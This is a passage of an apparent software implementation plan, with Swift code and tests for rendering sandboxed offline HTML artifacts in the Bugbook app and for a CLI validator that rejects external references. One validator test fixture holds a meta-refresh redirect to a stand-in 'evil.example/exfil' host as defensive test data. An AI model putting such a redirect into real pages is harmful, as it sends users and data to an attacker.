                .font(ShellZoomMetrics.font(Typography.bodySmall))
                .lineLimit(1)
                .truncationMode(.middle)
            Spacer()
            Button { model.requestReload() } label: {
                Image(systemName: "arrow.clockwise")
            }
            .buttonStyle(.plain)
            .help("Reload artifact")
            Button {
                NSWorkspace.shared.activateFileViewerSelecting([URL(fileURLWithPath: filePath)])
            } label: {
                Image(systemName: "folder")
            }
            .buttonStyle(.plain)
            .help("Reveal in Finder")
        }
        .padding(.horizontal, ShellZoomMetrics.size(12))
        .frame(height: ShellZoomMetrics.size(32))
    }

    private var chromeTitle: String {
        if let title = model.manifest?.title, !title.isEmpty { return title }
        return (filePath as NSString).lastPathComponent.removingPageExtension
    }

    private var chromeIconName: String {
        if let icon = model.manifest?.icon, icon.hasPrefix("sf:") {
            return String(icon.dropFirst(3))
        }
        return "doc.richtext"
    }

    private func failureView(_ message: String) -> some View {
        VStack(spacing: ShellZoomMetrics.size(8)) {
            Image(systemName: "exclamationmark.triangle")
                .font(ShellZoomMetrics.font(24))
                .foregroundStyle(.secondary)
            Text("Artifact could not be displayed")
                .font(ShellZoomMetrics.font(Typography.body))
            Text(message)
                .font(ShellZoomMetrics.font(Typography.caption))
                .foregroundStyle(.secondary)
            Button("Try Again") {
                Task { await model.open(filePath: filePath) }
            }
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
    }

    /// T4 mitigation: mandatory native confirmation showing the full URL before
    /// any external navigation leaves the sandbox.
    private func confirmExternalLink(_ url: URL) {
        let alert = NSAlert()
        alert.messageText = "Open external link?"
        alert.informativeText = url.absoluteString
        alert.alertStyle = .warning
        alert.addButton(withTitle: "Open Link")
        alert.addButton(withTitle: "Cancel")
        guard alert.runModal() == .alertFirstButtonReturn else { return }
        if let onOpenExternalURL {
            onOpenExternalURL(url)
        } else {
            NSWorkspace.shared.open(url)
        }
    }
}

/// One render session per pane open: a unique token, its scheme handler, the
/// configuration carrying the rule list, and the retained navigation policy
/// (WKWebView delegates are weak — this object must own it).
struct ArtifactRenderSession {
    let handler: ArtifactSchemeHandler
    let configuration: WKWebViewConfiguration
    let navigationPolicy: ArtifactNavigationPolicy
}

@MainActor
@Observable
final class ArtifactPaneModel {
    enum State {
        case loading
        case ready(ArtifactRenderSession)
        case failed(String)
    }

    private(set) var state: State = .loading
    private(set) var manifest: ArtifactManifest?
    private(set) var reloadCounter = 0

    @ObservationIgnored var onManifestLoaded: ((ArtifactManifest) -> Void)?
    @ObservationIgnored var onExternalLinkRequest: ((URL) -> Void)?
    @ObservationIgnored private var watcher: WorkspaceWatcher?
    @ObservationIgnored private var filePath: String = ""
    @ObservationIgnored private var lastModified: Date?

    var isReady: Bool { if case .ready = state { return true }; return false }

    func open(filePath: String) async {
        self.filePath = filePath
        state = .loading

        guard FileManager.default.fileExists(atPath: filePath) else {
            state = .failed("File not found: \(filePath)")
            return
        }

        refreshManifest()

        // Fail closed: no rule list, no render. Never fall back to an
        // unprotected load.
        let ruleList: WKContentRuleList
        do {
            ruleList = try await ArtifactSandbox.networkBlockRuleList()
        } catch {
            Log.fileSystem.error("Artifact rule list compile failed: \(error.localizedDescription)")
            state = .failed("Sandbox unavailable — artifact not rendered.")
            return
        }

        let handler = ArtifactSchemeHandler(fileURL: URL(fileURLWithPath: filePath))
        let policy = ArtifactNavigationPolicy(artifactURL: handler.artifactURL)
        policy.onExternalLinkRequest = { [weak self] url in
            self?.onExternalLinkRequest?(url)
        }
        let configuration = ArtifactSandbox.makeConfiguration(handler: handler, ruleList: ruleList)
        state = .ready(ArtifactRenderSession(
            handler: handler,
            configuration: configuration,
            navigationPolicy: policy
        ))

        startWatcher()
    }

    func requestReload() {
        refreshManifest()
        reloadCounter += 1
    }

    func close() {
        watcher?.stop()
        watcher = nil
    }

    private func refreshManifest() {
        let loaded = ArtifactManifest.load(contentsOf: URL(fileURLWithPath: filePath))
        manifest = loaded
        lastModified = fileModificationDate()
        if let loaded {
            onManifestLoaded?(loaded)
        }
    }

    /// Watch the parent directory (atomic save-replace changes the file's inode,
    /// which a file-level watch would lose) and reload when the artifact's
    /// mtime moves. ~300 ms debounce + 300 ms FSEvents latency per design doc.
    private func startWatcher() {
        watcher?.stop()
        let directory = (filePath as NSString).deletingLastPathComponent
        let watcher = WorkspaceWatcher(debounceInterval: 0.3, latency: 0.3) { [weak self] in
            self?.handleDirectoryChange()
        }
        watcher.watch(path: directory)
        self.watcher = watcher
    }

    private func handleDirectoryChange() {
        guard FileManager.default.fileExists(atPath: filePath) else {
            state = .failed("File was deleted or moved.")
            return
        }
        let modified = fileModificationDate()
        guard modified != lastModified else { return }
        requestReload()
    }

    private func fileModificationDate() -> Date? {
        (try? FileManager.default.attributesOfItem(atPath: filePath))?[.modificationDate] as? Date
    }
}
```

Style notes: `Color.fallbackEditorBg`, `ShellZoomMetrics`, and `Typography.bodySmall` are verified house symbols (`ContentView.swift:1475`, `Views/Components/ShellZoomMetrics.swift:3`, `FileTreeItemView.swift:190`). If `Typography.body`/`Typography.caption` don't exist as constants, substitute the nearest existing Typography sizes — the chrome layout is the contract, not the exact point sizes.

- [ ] **Step 5.4: Route artifacts in ContentView**

In `paneContentRouting` (`ContentView.swift:2171-2207`), insert a branch after the `file.isDatabase` branch (after line 2196) and before the `blockDocuments[file.id]` meeting-page lookup (decision 1):

```swift
        } else if file.isArtifact {
            ArtifactPaneView(
                filePath: file.path,
                onManifestLoaded: { manifest in
                    applyArtifactManifest(manifest, toTab: file.id)
                },
                onOpenExternalURL: { url in
                    openArtifactExternalURL(url)
                }
            )
            .id(file.id)
```

Add the two helpers near `updateDatabaseRowTabTitle` (~5808):

```swift
    /// Mirrors the doc-title sync pattern: the manifest's bugbook-title/-icon
    /// upgrade the tab chrome once the artifact pane has read them.
    private func applyArtifactManifest(_ manifest: ArtifactManifest, toTab tabId: UUID) {
        workspaceManager.updateOpenFile(tabId: tabId, persist: false) { file in
            if let title = manifest.title, !title.isEmpty { file.displayName = title }
            if let icon = manifest.icon, !icon.isEmpty { file.icon = icon }
        }
    }

    /// L1 external-link policy: confirmed links go to the browser pane when
    /// available, otherwise to the system browser.
    private func openArtifactExternalURL(_ url: URL) {
        if BugbookFeatureGate.legacyPanesEnabled {
            openContentInFocusedPane(.browserDocument(urlString: url.absoluteString, title: url.host ?? "Browser"))
        } else {
            NSWorkspace.shared.open(url)
        }
    }
```

(`openContentInFocusedPane` is at `ContentView.swift:1960`; `.browserDocument(urlString:title:)` factory at `PaneContent.swift:67` — both verified.)

Fix the pane-header options popover so it isn't empty for artifacts — at `ContentView.swift:1802-1808` replace:

```swift
            .floatingPopover(isPresented: pageOptionsMenuBinding(for: leaf.id)) {
                if file.isDatabaseRow {
                    databaseRowOptionsMenu(for: file)
                } else if let doc = blockDocuments[file.id] {
                    pageOptionsMenu(for: file, document: doc)
                }
            }
```

with:

```swift
            .floatingPopover(isPresented: pageOptionsMenuBinding(for: leaf.id)) {
                if file.isDatabaseRow {
                    databaseRowOptionsMenu(for: file)
                } else if file.isArtifact {
                    artifactOptionsMenu(for: file)
                } else if let doc = blockDocuments[file.id] {
                    pageOptionsMenu(for: file, document: doc)
                }
            }
```

and add (near `pageOptionsMenu`, match its button styling — see ~5394):

```swift
    @ViewBuilder
    private func artifactOptionsMenu(for file: OpenFile) -> some View {
        VStack(alignment: .leading, spacing: 2) {
            Button {
                NSPasteboard.general.clearContents()
                NSPasteboard.general.setString(file.path, forType: .string)
            } label: {
                Label("Copy Path", systemImage: "link")
            }
            .buttonStyle(.plain)
            Button {
                NSWorkspace.shared.activateFileViewerSelecting([URL(fileURLWithPath: file.path)])
            } label: {
                Label("Show in Finder", systemImage: "folder")
            }
            .buttonStyle(.plain)
        }
        .padding(8)
    }
```

- [ ] **Step 5.5: Write pane-model tests**

Create `Tests/BugbookTests/ArtifactPaneModelTests.swift`:

```swift
import XCTest
@testable import Bugbook
import BugbookCore

@MainActor
final class ArtifactPaneModelTests: XCTestCase {
    private var tempDir: URL!

    override func setUp() async throws {
        if ProcessInfo.processInfo.environment["BUGBOOK_SKIP_WEBKIT_TESTS"] == "1" {
            throw XCTSkip("WebKit live tests disabled by BUGBOOK_SKIP_WEBKIT_TESTS")
        }
        tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("ArtifactPaneModelTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
    }

    override func tearDown() async throws {
        if let tempDir { try? FileManager.default.removeItem(at: tempDir) }
    }

    func testOpenBecomesReadyAndLoadsManifest() async throws {
        let path = tempDir.appendingPathComponent("a.html").path
        try """
        <!doctype html><meta name="bugbook-artifact" content="1">
        <meta name="bugbook-title" content="Test Artifact">
        """.write(toFile: path, atomically: true, encoding: .utf8)

        let model = ArtifactPaneModel()
        var manifestTitle: String?
        model.onManifestLoaded = { manifestTitle = $0.title }
        await model.open(filePath: path)

        XCTAssertTrue(model.isReady)
        XCTAssertEqual(model.manifest?.title, "Test Artifact")
        XCTAssertEqual(manifestTitle, "Test Artifact")
        model.close()
    }

    func testOpenMissingFileFails() async {
        let model = ArtifactPaneModel()
        await model.open(filePath: tempDir.appendingPathComponent("missing.html").path)
        XCTAssertFalse(model.isReady)
    }

    func testOnDiskChangeBumpsReloadCounter() async throws {
        let path = tempDir.appendingPathComponent("live.html").path
        try #"<!doctype html><meta name="bugbook-artifact" content="1">"#
            .write(toFile: path, atomically: true, encoding: .utf8)

        let model = ArtifactPaneModel()
        await model.open(filePath: path)
        XCTAssertTrue(model.isReady)
        XCTAssertEqual(model.reloadCounter, 0)

        // FSEvents latency 0.3 + debounce 0.3 → expect a bump well within 8 s.
        try #"<!doctype html><meta name="bugbook-artifact" content="1"><p>v2</p>"#
            .write(toFile: path, atomically: true, encoding: .utf8)

        let deadline = Date().addingTimeInterval(8)
        while model.reloadCounter == 0, Date() < deadline {
            try await Task.sleep(nanoseconds: 100_000_000)
        }
        XCTAssertGreaterThan(model.reloadCounter, 0, "on-disk change should trigger a live reload")
        model.close()
    }
}
```

- [ ] **Step 5.6: Run tests, then verify manually in the app**

Run: `swift test --filter ArtifactPaneModelTests && swift build`
Expected: PASS.

Manual verification (design doc §7.4) — create a scratch workspace and run the app:

```bash
SCRATCH=$(mktemp -d)/Workspace && mkdir -p "$SCRATCH"
printf '# Demo\n\nSee [hostile](hostile-artifact.html)\n' > "$SCRATCH/Demo.md"
cp Tests/BugbookTests/Fixtures/hostile-artifact.html "$SCRATCH/"
swift run Bugbook   # point it at $SCRATCH (workspace picker / settings)
```

Checklist:
1. `hostile-artifact.html` appears in the sidebar with the richtext icon.
2. Clicking it renders the pane; the in-page report shows every probe `blocked` (except `control-img-data`).
3. Tab title becomes "Hostile Artifact — escape-attempt fixture" (manifest title).
4. `echo '<p>edit</p>' >> "$SCRATCH/hostile-artifact.html"` → open pane live-reloads within ~1 s.
5. Add `<a href="https://example.com">out</a>` to a benign artifact → click → native confirmation sheet shows the full URL; Cancel does nothing; Open Link routes to browser pane (legacy mode) or default browser.
6. Rename + duplicate + trash the artifact from the sidebar context menu — extension preserved, no folder collateral.

- [ ] **Step 5.7: Commit**

```bash
git add Sources/Bugbook/Views/Artifacts Sources/Bugbook/Services/WorkspaceWatcher.swift Sources/Bugbook/Views/ContentView.swift Tests/BugbookTests/ArtifactPaneModelTests.swift
git commit -m "Render artifacts in a sandboxed pane with live reload and link confirmation"
```

---

## Task 6: Internal links resolve `.html` targets

**Files:**
- Modify: `Sources/Bugbook/Views/ContentView.swift:5608-5630 (navigateToPage), 5755-5766 (navigateToFilePath)`
- Modify: `Sources/Bugbook/Models/BlockDocument.swift:1625-1634`
- Test: `Tests/BugbookTests/ArtifactModelTests.swift` (extend)

- [ ] **Step 6.1: Write the failing tests**

Add to `ArtifactModelTests.swift`:

```swift
    func testIsSidebarPagePathAcceptsHtml() {
        XCTAssertTrue(BlockDocument.isSidebarPagePath("/ws/Weekly Review/sleep-trends.html"))
        XCTAssertTrue(BlockDocument.isSidebarPagePath("/ws/Page.md"))
        XCTAssertFalse(BlockDocument.isSidebarPagePath("/ws/archive.tar"))
        XCTAssertFalse(BlockDocument.isSidebarPagePath("relative/path.html"))
    }

    func testPageNameFromPathStripsHtml() {
        XCTAssertEqual(BlockDocument.pageNameFromPath("/ws/Weekly Review/sleep-trends.html"), "sleep-trends")
        XCTAssertEqual(BlockDocument.pageNameFromPath("/ws/Page.md"), "Page")
    }
```

Run: `swift test --filter ArtifactModelTests` → FAIL (html path returns false / unstripped name).

- [ ] **Step 6.2: Implement**

`BlockDocument.swift:1625-1634` — replace both helpers:

```swift
    /// Returns true if the payload string looks like a sidebar document file path.
    static func isSidebarPagePath(_ payload: String) -> Bool {
        payload.hasPrefix("/") && (payload.hasSuffix(".md") || payload.hasSuffix(".html"))
    }

    /// Extracts the display name from a sidebar file path.
    static func pageNameFromPath(_ path: String) -> String {
        (path as NSString).lastPathComponent.removingPageExtension
    }
```

(Note: `removingPageExtension` lives in the app target (`FileEntry.swift`); `BlockDocument` is in the app target too, so it resolves.)

`ContentView.navigateToFilePath` (5755-5766) — replace the kind inference:

```swift
    private func navigateToFilePath(_ path: String) {
        let entry: FileEntry
        if let existing = fileSystem.findEntry(path: path, in: appState.fileTree) {
            entry = existing
        } else {
            let name = (path as NSString).lastPathComponent
            let kind: TabKind
            if fileSystem.isDatabaseFolder(at: path) {
                kind = .database
            } else if path.hasSuffix(".html") {
                kind = .artifact
            } else {
                kind = .page
            }
            entry = FileEntry(id: path, name: name, path: path, isDirectory: false, kind: kind)
        }
        navigateToEntryInPane(entry)
    }
```

`ContentView.navigateToPage(named:)` (5608-5630) — two additions: extensionless `[[sleep-trends]]` wiki links match artifact entries, and a filesystem fallback resolves artifact paths hidden from the tree (row-attached `_artifacts/...`). Replace the function body:

```swift
    private func navigateToPage(named pageName: String) {
        if let dbPath = resolveDatabasePath(from: pageName) {
            openDatabase(at: dbPath)
            return
        }

        func findEntry(in entries: [FileEntry]) -> FileEntry? {
            for entry in entries {
                let entryName = entry.name.replacingOccurrences(of: ".md", with: "")
                if entryName.localizedCaseInsensitiveCompare(pageName) == .orderedSame
                    || entryName.removingPageExtension.localizedCaseInsensitiveCompare(pageName) == .orderedSame {
                    return entry
                }
                if let children = entry.children, let found = findEntry(in: children) {
                    return found
                }
            }
            return nil
        }

        if let entry = findEntry(in: appState.fileTree) {
            navigateToEntryInPane(entry)
            return
        }

        // Artifact targets hidden from the sidebar (`_artifacts/…` row-attached
        // convention) resolve against the filesystem: workspace-relative first,
        // then relative to the current page's directory and companion folder.
        if pageName.hasSuffix(".html"), let workspace = appState.workspacePath {
            var candidates = [(workspace as NSString).appendingPathComponent(pageName)]
            if let currentPath = workspaceManager.focusedOpenFile?.path, currentPath.hasPrefix("/") {
                let pageDir = (currentPath as NSString).deletingLastPathComponent
                candidates.append((pageDir as NSString).appendingPathComponent(pageName))
                if currentPath.hasSuffix(".md") {
                    candidates.append(
                        (String(currentPath.dropLast(3)) as NSString).appendingPathComponent(pageName))
                }
            }
            if let resolved = candidates.first(where: { FileManager.default.fileExists(atPath: $0) }) {
                navigateToFilePath(resolved)
            }
        }
    }
```

(`workspaceManager.focusedOpenFile` verified at `WorkspaceManager.swift:45`; `appState.workspacePath` is the established accessor — check its exact name in AppState when implementing and adjust if it differs.)

- [ ] **Step 6.3: Run and verify**

Run: `swift test --filter ArtifactModelTests && swift build`
Expected: PASS. Manual: in the scratch workspace, `[[sleep-trends]]` and `[[sleep-trends.html]]` wiki links in `Demo.md` both open the artifact pane.

- [ ] **Step 6.4: Commit**

```bash
git add Sources/Bugbook/Views/ContentView.swift Sources/Bugbook/Models/BlockDocument.swift Tests/BugbookTests/ArtifactModelTests.swift
git commit -m "Resolve .html artifact targets in wiki links and file path navigation"
```

---

## Task 7: CLI `bugbook artifact create | validate | list`

The agent feedback loop. Validation decisions (locked): `href` errors on every tag **except `<a>`/`<area>`** (anchor clicks go through the native confirmation sheet; resource hrefs fetch silently). Blocked in resource contexts: `http:`, `https:`, `ws:`, `wss:`, `file:`, and protocol-relative `//`; `data:`/`blob:`/`#`/relative allowed. `<meta http-equiv="refresh">` to an external URL → error. Inline-JS `fetch("https://…")` → **warning only** (static JS analysis can't be sound; the runtime sandbox is the enforcement — validate is lint, not the security boundary). `list` shows marker-bearing files only. `create` validates **in memory and writes only on success** (no transient bad file for FSEvents to pick up; overwrite = normal regeneration). Validation failure prints the JSON report to stdout then `throw ExitCode.failure` (JSON is the machine-readable surface; exit 1).

Verified existing helpers to reuse: `normalizePath` (`NoteHelpers.swift:1115`), `isPathInsideWorkspace` (`:1111`), `relativePath(from:workspace:)` (`:1102`), `readTextInput(from:)` (`:667`), `outputJSON`/`CLIError` (`Helpers.swift`), `iso8601String(from:)` (`Helpers.swift:401`), `WorkspacePathRules.shouldIgnoreRelativePath` (`BugbookCore/Workspace/WorkspacePathRules.swift:4` — skips dot-prefixed components, keeps `_artifacts/`, exactly right).

**Files:**
- Create: `Sources/BugbookCLI/Commands/ArtifactCommand.swift`
- Modify: `Sources/BugbookCLI/BugbookCLI.swift:10`
- Test: `Tests/BugbookCLITests/BugbookCLITests.swift` (extend; house pattern `parseAsRoot` + `runJSON`/`runJSONArray` at 2852-2868, `writeTempFile` at 2831, `makeWorkspace` at 2755)

- [ ] **Step 7.1: Write the failing tests**

Add inside `final class BugbookCLITests`:

```swift
    // MARK: - Artifacts

    func testArtifactCreateValidateAndListRoundTrip() throws {
        let workspace = try makeWorkspace()

        let created = try runJSON(
            Artifact.Create.parseAsRoot([
                "--workspace", workspace,
                "Weekly Review/sleep-trends.html",
                "--content-file", try writeTempFile(in: workspace, name: "good.html", contents: validArtifactHTML)
            ])
        )
        XCTAssertEqual(created["created"] as? Bool, true)
        XCTAssertEqual(created["relative_path"] as? String, "Weekly Review/sleep-trends.html")
        XCTAssertEqual(created["title"] as? String, "Sleep Trends")
        XCTAssertEqual(created["markdown_link"] as? String, "[Sleep Trends](Weekly Review/sleep-trends.html)")
        XCTAssertEqual((created["errors"] as? [String])?.isEmpty, true)
        XCTAssertTrue(FileManager.default.fileExists(
            atPath: (workspace as NSString).appendingPathComponent("Weekly Review/sleep-trends.html")
        ))

        let validated = try runJSON(
            Artifact.Validate.parseAsRoot([
                "--workspace", workspace,
                "Weekly Review/sleep-trends.html"
            ])
        )
        XCTAssertEqual(validated["valid"] as? Bool, true)

        _ = try runJSON(
            Artifact.Create.parseAsRoot([
                "--workspace", workspace,
                "Tickets/_artifacts/2026-W23-board.html",
                "--content-file", try writeTempFile(in: workspace, name: "board.html", contents: validArtifactHTML)
            ])
        )

        // Decoys: unmarked html at root, and a marked html inside a hidden dir.
        try "<!DOCTYPE html><html><body>not an artifact</body></html>".write(
            toFile: (workspace as NSString).appendingPathComponent("plain.html"),
            atomically: true, encoding: .utf8
        )
        let hiddenDir = (workspace as NSString).appendingPathComponent(".hidden")
        try FileManager.default.createDirectory(atPath: hiddenDir, withIntermediateDirectories: true)
        try validArtifactHTML.write(
            toFile: (hiddenDir as NSString).appendingPathComponent("ghost.html"),
            atomically: true, encoding: .utf8
        )

        let listed = try runJSONArray(
            Artifact.List.parseAsRoot(["--workspace", workspace])
        )
        XCTAssertEqual(listed.count, 2)
        XCTAssertEqual(
            listed.compactMap { $0["relative_path"] as? String },
            ["Tickets/_artifacts/2026-W23-board.html", "Weekly Review/sleep-trends.html"]
        )
        XCTAssertEqual(listed.last?["title"] as? String, "Sleep Trends")
        XCTAssertNotNil(listed.last?["size_bytes"])
    }

    func testArtifactCreateRejectsExternalScriptAndWritesNothing() throws {
        let workspace = try makeWorkspace()
        let contentPath = try writeTempFile(in: workspace, name: "cdn.html", contents: """
        <!DOCTYPE html><html><head>
        <meta name="bugbook-artifact" content="1">
        <meta name="bugbook-title" content="Bad">
        <script src="https://cdn.example.com/chart.min.js"></script>
        </head><body></body></html>
        """)

        XCTAssertThrowsError(
            try captureStandardOutput {
                var command = try Artifact.Create.parseAsRoot([
                    "--workspace", workspace,
                    "bad-artifact.html",
                    "--content-file", contentPath
                ])
                try command.run()
            }
        ) { error in
            XCTAssertTrue(error is ExitCode)
        }
        XCTAssertFalse(FileManager.default.fileExists(
            atPath: (workspace as NSString).appendingPathComponent("bad-artifact.html")
        ))
    }

    func testArtifactValidationFlagsExternalReferences() throws {
        let report = validateArtifactContent("""
        <!DOCTYPE html><html><head>
        <meta name="bugbook-artifact" content="1">
        <meta name="bugbook-title" content="Probe">
        <meta http-equiv="refresh" content="0;url=https://evil.example/exfil">
        <link rel="stylesheet" href="//cdn.example.com/style.css">
        <style>@import "https://fonts.example.com/font.css"; .a { background: url(https://x.example/i.png); }</style>
        </head><body>
        <script src="https://cdn.example.com/chart.js"></script>
        <img srcset="https://cdn.example.com/a.png 1x, local.png 2x">
        </body></html>
        """)
        XCTAssertFalse(report.isValid)
        let joined = report.errors.joined(separator: "\n")
        XCTAssertTrue(joined.contains("src on <script>"))
        XCTAssertTrue(joined.contains("href on <link>"))
        XCTAssertTrue(joined.contains("srcset on <img>"))
        XCTAssertTrue(joined.contains("@import"))
        XCTAssertTrue(joined.contains("url() reference in CSS"))
        XCTAssertTrue(joined.contains("http-equiv=\"refresh\""))
        XCTAssertGreaterThanOrEqual(report.errors.count, 6)
    }

    func testArtifactValidationAllowsAnchorsDataURIsAndRelativeRefs() throws {
        let report = validateArtifactContent("""
        <!DOCTYPE html><html><head>
        <meta name="bugbook-artifact" content="1">
        <meta name="bugbook-title" content="Allowed">
        </head><body>
        <a href="https://github.com/anthropics/claude-code">external link</a>
        <a href="#section">fragment</a>
        <img src="data:image/png;base64,iVBORw0KGgo=">
        <img src="blob:abc">
        <script type="application/json" id="data">{"url":"https://example.com/just-data"}</script>
        </body></html>
        """)
        XCTAssertTrue(report.isValid, "unexpected errors: \(report.errors)")
        XCTAssertEqual(report.title, "Allowed")
    }

    func testArtifactValidationMarkerAndManifestDiagnostics() throws {
        let missing = validateArtifactContent("<!DOCTYPE html><html><head><title>x</title></head><body></body></html>")
        XCTAssertTrue(missing.errors.joined().contains("Missing required <meta name=\"bugbook-artifact\""))

        let late = validateArtifactContent(
            "<!DOCTYPE html><html><head><!-- " + String(repeating: "x", count: 5000) + " -->"
            + "<meta name=\"bugbook-artifact\" content=\"1\"></head><body></body></html>"
        )
        XCTAssertTrue(late.errors.joined().contains("after the first 4096 bytes"))

        let badManifest = validateArtifactContent("""
        <!DOCTYPE html><html><head>
        <meta name="bugbook-artifact" content="1">
        <meta name="bugbook-title" content="Manifest">
        <script type="application/bugbook-manifest">{ not json }</script>
        </head><body></body></html>
        """)
        XCTAssertTrue(badManifest.errors.joined().contains("bugbook-manifest JSON does not parse"))
    }

    func testArtifactValidationSizeLimits() throws {
        let head = """
        <!DOCTYPE html><html><head>
        <meta name="bugbook-artifact" content="1">
        <meta name="bugbook-title" content="Big">
        </head><body><!--
        """
        let tail = "--></body></html>"

        let warned = validateArtifactContent(head + String(repeating: "a", count: 3 * 1024 * 1024) + tail)
        XCTAssertTrue(warned.isValid)
        XCTAssertTrue(warned.warnings.joined().contains("2 MB"))

        let rejected = validateArtifactContent(head + String(repeating: "a", count: 11 * 1024 * 1024) + tail)
        XCTAssertTrue(rejected.errors.joined().contains("10 MB"))
    }
```

And a file-bottom constant (next to the other private helpers, after ~line 2895):

```swift
private let validArtifactHTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="Sleep Trends">
<meta name="bugbook-icon" content="sf:bed.double">
<meta name="bugbook-generator" content="bugbook-cli-tests">
<style>body { font-family: -apple-system, sans-serif; }</style>
</head>
<body>
<h1>Sleep Trends</h1>
<a href="https://example.com/docs">External docs link (allowed)</a>
<script type="application/json" id="data">[{"day":"2026-06-01","hours":7.4}]</script>
<script>const data = JSON.parse(document.getElementById("data").textContent);</script>
</body>
</html>
"""
```

(`ExitCode` needs `import ArgumentParser` — already imported in this test file via the existing command tests.)

- [ ] **Step 7.2: Run to verify failure**

Run: `swift test --filter BugbookCLITests`
Expected: COMPILE ERROR — `cannot find 'Artifact' in scope`, `cannot find 'validateArtifactContent' in scope`.

- [ ] **Step 7.3: Implement the command**

Create `Sources/BugbookCLI/Commands/ArtifactCommand.swift` (complete file; the validator is a pure internal function so tests assert on findings directly — `@testable import BugbookCLI` is already in use):

```swift
import ArgumentParser
import Foundation
import BugbookCore

struct Artifact: ParsableCommand {
    static let configuration = CommandConfiguration(
        commandName: "artifact",
        abstract: "Create, validate, and list self-contained HTML artifacts",
        discussion: """
        Artifacts are single self-contained .html files rendered in a sandboxed,
        offline pane. All CSS, JS, and data must be inline; external network
        references are rejected. Markdown remains the source of truth — always
        link an artifact from its parent page or row body.
        """,
        subcommands: [Create.self, Validate.self, List.self]
    )

    struct Create: ParsableCommand {
        static let configuration = CommandConfiguration(
            commandName: "create",
            abstract: "Validate HTML artifact content and write it into the workspace"
        )

        @OptionGroup var options: Bugbook.Options

        @Argument(help: "Target path inside the workspace, ending in .html (e.g. \"Weekly Review/sleep-trends.html\" or \"Tickets/_artifacts/2026-W23-board.html\")")
        var path: String

        @Option(name: .long, help: "HTML content file path, or - for stdin")
        var contentFile: String

        func run() throws {
            let workspace = normalizePath(options.resolvedWorkspace)
            let target = try resolveArtifactWritePath(path, workspace: workspace)
            let content = try readTextInput(from: contentFile)
            let report = validateArtifactContent(content)
            let relative = relativePath(from: target, workspace: workspace)

            guard report.isValid else {
                var json = report.toJSON()
                json["created"] = false
                json["path"] = target
                json["relative_path"] = relative
                try outputJSON(json)
                throw ExitCode.failure
            }

            let fm = FileManager.default
            let replacedExisting = fm.fileExists(atPath: target)
            try fm.createDirectory(
                atPath: (target as NSString).deletingLastPathComponent,
                withIntermediateDirectories: true
            )
            try content.write(toFile: target, atomically: true, encoding: .utf8)

            let fallbackTitle = ((target as NSString).lastPathComponent as NSString).deletingPathExtension
            var json = report.toJSON()
            json["created"] = true
            json["replaced_existing"] = replacedExisting
            json["path"] = target
            json["relative_path"] = relative
            json["markdown_link"] = "[\(report.title ?? fallbackTitle)](\(relative))"
            try outputJSON(json)
        }
    }

    struct Validate: ParsableCommand {
        static let configuration = CommandConfiguration(
            commandName: "validate",
            abstract: "Validate an HTML artifact (marker, self-containment, size); exits nonzero on errors"
        )

        @OptionGroup var options: Bugbook.Options

        @Argument(help: "Artifact path (workspace-relative or absolute)")
        var path: String

        func run() throws {
            let workspace = normalizePath(options.resolvedWorkspace)
            let target = try resolveArtifactReadPath(path, workspace: workspace)
            guard let content = try? String(contentsOfFile: target, encoding: .utf8) else {
                throw CLIError.invalidInput("Artifact is not readable UTF-8 text: \(path)")
            }
            let report = validateArtifactContent(content)
            var json = report.toJSON()
            json["path"] = target
            if isPathInsideWorkspace(target, workspace: workspace) {
                json["relative_path"] = relativePath(from: target, workspace: workspace)
            }
            try outputJSON(json)
            if !report.isValid {
                throw ExitCode.failure
            }
        }
    }

    struct List: ParsableCommand {
        static let configuration = CommandConfiguration(
            commandName: "list",
            abstract: "List HTML artifacts in the workspace (files carrying the bugbook-artifact marker)"
        )

        @OptionGroup var options: Bugbook.Options

        func run() throws {
            let workspace = normalizePath(options.resolvedWorkspace)
            let fm = FileManager.default
            var items: [[String: Any]] = []

            if let enumerator = fm.enumerator(atPath: workspace) {
                while let relative = enumerator.nextObject() as? String {
                    if WorkspacePathRules.shouldIgnoreRelativePath(relative) { continue }
                    guard relative.lowercased().hasSuffix(".html") else { continue }
                    let absolute = (workspace as NSString).appendingPathComponent(relative)

                    guard let handle = FileHandle(forReadingAtPath: absolute) else { continue }
                    let prefixData = handle.readData(ofLength: ArtifactManifest.scanByteLimit)
                    try? handle.close()
                    let prefix = String(decoding: prefixData, as: UTF8.self)
                    guard let manifest = ArtifactManifest.parse(prefix) else { continue }

                    let attrs = (try? fm.attributesOfItem(atPath: absolute)) ?? [:]
                    var item: [String: Any] = [
                        "relative_path": relative,
                        "path": absolute,
                        "size_bytes": (attrs[.size] as? NSNumber)?.intValue ?? 0,
                    ]
                    if let title = manifest.title { item["title"] = title }
                    if let icon = manifest.icon { item["icon"] = icon }
                    if let generator = manifest.generator { item["generator"] = generator }
                    if let modified = attrs[.modificationDate] as? Date {
                        item["modified_at"] = iso8601String(from: modified)
                    }
                    items.append(item)
                }
            }

            items.sort {
                (($0["relative_path"] as? String) ?? "") < (($1["relative_path"] as? String) ?? "")
            }
            try outputJSON(items)
        }
    }
}

// MARK: - Validation engine

let artifactSizeWarnBytes = 2 * 1024 * 1024
let artifactSizeErrorBytes = 10 * 1024 * 1024

struct ArtifactValidationReport {
    var errors: [String] = []
    var warnings: [String] = []
    var title: String?
    var icon: String?
    var generator: String?
    var sizeBytes: Int = 0

    var isValid: Bool { errors.isEmpty }

    func toJSON() -> [String: Any] {
        var json: [String: Any] = [
            "valid": isValid,
            "errors": errors,
            "warnings": warnings,
            "size_bytes": sizeBytes,
        ]
        if let title { json["title"] = title }
        if let icon { json["icon"] = icon }
        if let generator { json["generator"] = generator }
        return json
    }
}

/// Validate artifact HTML for the agent feedback loop. This is a lint, not the
/// security boundary — the rendering sandbox (CSP + content rule list) is the
/// enforcement. Pure function so tests can assert on specific findings.
func validateArtifactContent(_ html: String) -> ArtifactValidationReport {
    var report = ArtifactValidationReport()
    report.sizeBytes = html.utf8.count

    if report.sizeBytes > artifactSizeErrorBytes {
        report.errors.append("Artifact is \(report.sizeBytes) bytes; the maximum is \(artifactSizeErrorBytes) bytes (10 MB). Slim the embedded data or split the artifact.")
    } else if report.sizeBytes > artifactSizeWarnBytes {
